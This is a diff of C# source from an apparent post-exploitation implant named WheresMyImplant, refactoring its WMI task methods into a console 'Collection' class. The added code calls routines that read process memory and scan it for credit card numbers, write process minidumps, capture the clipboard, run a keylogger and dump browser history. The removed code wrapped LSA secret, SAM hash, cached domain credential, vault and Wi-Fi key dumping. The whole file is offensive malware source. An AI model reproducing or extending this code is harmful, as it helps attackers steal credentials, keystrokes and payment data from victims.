@@ -1,182 +1,122 @@
 ﻿using System;
-using System.Management.Instrumentation;
-using System.Text;
+using System.Linq;
 
 namespace WheresMyImplant
 {
-    public partial class Implant
+    public sealed class Collection
     {
-        [ManagementTask]
-        public static String DumpLsa()
+        //Checked
+        public static void DumpBrowserHistory()
         {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if (checkSystem.GetSystem())
+            try
             {
-                LSASecrets lsaSecrets = new LSASecrets();
-                lsaSecrets.DumpLSASecrets();
-                results = lsaSecrets.GetOutput();
+                BrowserHistory history = new BrowserHistory();
+                history.InternetExplorer();
+                history.Firefox();
+                history.Chrome();
             }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpSAM()
-        {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if (checkSystem.GetSystem())
+            catch (Exception ex)
             {
-                SAM sam = new SAM();
-                results = sam.GetOutput();
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String DumpDomainCache()
+        //Checked
+        public static void ReadProcessMemory(String processId)
         {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if (checkSystem.GetSystem())
+            try
             {
-                CacheDump cacheDump = new CacheDump();
-                results = cacheDump.GetOutput();
+                if (!Int32.TryParse(processId, out Int32 pid))
+                {
+                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
+                    if (0 < process.Length)
+                    {
+                        pid = process.First().Id;
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Unable to parse {0}", processId);
+                        return;
+                    }
+                }
+
+                ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
+                if (!readProcessMemory.OpenProcess())
+                    Console.WriteLine("[-] Unable to open process", pid);
+
+                readProcessMemory.ReadProcesMemory();
+                Console.WriteLine("\n-----\n");
+                CheckCCNumber(readProcessMemory.GetPrintableMemory());
             }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpVault()
-        {
-            StringBuilder output = new StringBuilder();
-            Vault vault = new Vault();
-            vault.EnumerateCredentials();
-
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            if (checkSystem.GetSystem())
+            catch (Exception ex)
             {
-                vault = new Vault();
-                vault.EnumerateCredentials();
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String DumpVaultCLI()
+        //Checked
+        public static void CheckCCNumber(String input)
         {
-            VaultCLI vault = new VaultCLI();
-            vault.EnumerateVaults();
-            return vault.GetOutput();
-        }
-
-        [ManagementTask]
-        public static String DumpBrowserHistory()
-        {
-            BrowserHistory history = new BrowserHistory();
-            history.InternetExplorer();
-            history.Firefox();
-            history.Chrome();
-            return history.GetOutput();
-        }
-
-        [ManagementTask]
-        public static String ReadProcessMemory(String processId)
-        {
-            StringBuilder output = new StringBuilder();
-            Int32 pid;
-            if (!Int32.TryParse(processId, out pid))
-            {
-                return output.ToString();
-            }
-
-            ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
-            if (!readProcessMemory.OpenProcess())
-            {
-                return output.ToString();
-            }
-            readProcessMemory.ReadProcesMemory();
-            output.Append(readProcessMemory.GetOutput());
-            output.Append("\n-----\n");
-            output.Append(CheckCCNumber(readProcessMemory.GetPrintableMemory()));
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String CheckCCNumber(String input)
-        {
-            StringBuilder output = new StringBuilder();
             foreach (String number in CheckCreditCard.CheckString(input))
             {
-                output.Append(number);
+                Console.WriteLine(number);
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String MiniDump(String processId, String fileName)
+        //Checked
+        public static void MiniDump(String processId, String fileName)
         {
-            StringBuilder output = new StringBuilder();
-            Int32 pid;
-            if (!Int32.TryParse(processId, out pid))
+            try
             {
-                return output.ToString();
-            }
+                if (!Int32.TryParse(processId, out Int32 pid))
+                {
+                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
+                    if (0 < process.Length)
+                    {
+                        pid = process.First().Id;
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Unable to parse {0}", processId);
+                        return;
+                    }
+                }
 
-            MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
-            miniDump.CreateMiniDump((UInt32)pid, fileName);
-            output.Append(miniDump.GetOutput());
-            return output.ToString();
+                MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
+                miniDump.CreateMiniDump((UInt32)pid, fileName);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] {0}", ex.Message);
+            }
         }
 
-        [ManagementTask]
-        public static String Clipboard()
+        //Checked
+        public static void Clipboard()
         {
-            StringBuilder output = new StringBuilder();
             try
             {
                 ClipboardManaged clipboard = new ClipboardManaged();
                 clipboard.Execute();
-                output.Append(clipboard.GetOutput());
             }
             catch (Exception ex)
             {
-                output.Append(ex.ToString());
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String Keylogger()
+        //Checked
+        public static void Keylogger()
         {
-            StringBuilder output = new StringBuilder();
             try
             {
                 KeyLogger clipboard = new KeyLogger();
                 clipboard.Execute();
-                output.Append(clipboard.GetOutput());
             }
             catch (Exception ex)
             {
-                output.Append(ex.ToString());
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String WirelessPreSharedKey()
-        {
-            StringBuilder output = new StringBuilder();
-            WirelessProfiles wp = new WirelessProfiles();
-            wp.GetProfiles();
-            output.Append(wp.GetOutput());
-            return output.ToString();
         }
     }
 }
